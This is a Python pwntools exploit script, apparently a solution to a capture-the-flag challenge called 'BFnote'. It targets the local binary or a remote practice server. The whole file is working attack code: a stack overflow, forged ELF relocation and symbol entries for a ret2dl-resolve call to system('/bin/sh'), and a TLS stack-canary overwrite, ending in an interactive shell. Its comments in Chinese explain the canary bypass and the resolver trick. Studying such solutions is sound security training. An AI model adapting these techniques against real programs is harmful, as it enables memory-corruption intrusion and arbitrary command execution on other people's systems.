#coding:utf-8
from pwn import *

context.log_level = 'debug'

debug = 1


def exp(debug):
	elf = ELF('./BFnote')

	if debug == 1:
		r = process('./BFnote')
		#gdb.attach(r, 'b *0x0804897A')
		#r = gdb.debug('./BFnote', 'b *0x080487A4')
		lib = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		r = remote('node3.buuoj.cn', 27644)
		lib = ELF('./libc.so.6')

	bss_start = 0x0804A060
	gap = 0x500
	stack_overflow = 'a' * (0x3e - 0xc + 0x8) + p64(bss_start + gap + 0x4)

	
	r.recvuntil('Give your description : ')
	r.send(stack_overflow)

	r.recvuntil('Give your postscript : ')

	#--------------------------通过ret2dl——resolve来获取system，从而完成pwn--------------------------------------------

	fake_sym = p32(bss_start + gap + 0x4 * 4 + 0x8 - 0x80482C8) + p32(0) + p32(0) + p32(0x12)
	fake_rel = p32(bss_start) + p32(0x7 + int((bss_start + gap + 0x4 * 4 + 0x8 + 0x8 + 0x8 - 0x080481D8) / 0x10) * 0x100)
	r.send('\x00' * gap + p32(0x08048450) + p32(bss_start + gap + 0x4 * 4 + 0x8 * 2 - 0x080483D0) + p32(0) + p32(bss_start + gap + 0x4 * 4) + '/bin/sh\x00' + 'system\x00\x00' + fake_rel + fake_sym)

	r.recvuntil('Give your notebook size : ')
	r.send(str(0x20000))

	#-------------------------通过修改tls绕过canary------------------------
	r.recvuntil('Give your title size : ')
	r.send(str(0xf7d1a714 - 0xf7cf9008 - 16))

	r.recvuntil('invalid ! please re-enter :\n')
	r.send(str(4))

	r.recvuntil('Give your title : ')
	r.send('a')
	
	r.recvuntil('Give your note : ')
	r.send('aaaa')

	
	r.interactive()
		




exp(debug)
